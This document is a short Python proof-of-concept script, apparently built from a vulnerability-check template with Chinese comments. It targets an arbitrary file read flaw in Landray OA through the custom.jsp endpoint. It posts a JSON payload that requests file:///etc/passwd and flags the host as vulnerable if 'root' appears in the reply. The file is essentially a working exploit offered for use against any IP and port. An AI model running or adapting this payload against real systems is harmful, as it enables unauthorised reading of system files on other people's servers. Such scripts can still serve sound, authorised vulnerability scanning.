#encoding:utf-8
try:
    import requests,os,sys,logging
    logging.basicConfig(level=logging.INFO,format="%(message)s")
except Exception as e:
    logging.info("[*] {}".format(e))
    os._exit(6)

def check(ip,port):
    target = "http://" + ip + ":" + port
    payload = "/sys/ui/extend/varkind/custom.jsp"                                #填写payload
    header = {
                              "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15",
                              "Content-Length": "42",
                              "Content-Type": "application/x-www-form-urlencoded",
                              "Accept-Encoding": "gzip"
                        }                                 #填写header头
    data = "var={\"body\":{\"file\":\"file:///etc/passwd\"}}"                                   #填写data数据
    try:
        req = requests.post(url=target+payload,headers=header,data=data,timeout=3)

        if req.status_code == 200:
            if (b'root' in req.text) :              #填写判断条件
                logging.info("[+] {} find landray_OA_Arbitrary_file_read".format(ip))                          #填写漏洞名
                os._exit(1)

        logging.info("[-] {} do not found landray_OA_Arbitrary_file_read".format(ip))                          #填写漏洞名
        os._exit(2)
    except Exception as e:
        logging.info("[*] {}".format(e))
        os._exit(4)

if __name__== "__main__":
    ip = sys.argv[1]
    port = sys.argv[2]
    check(ip,port)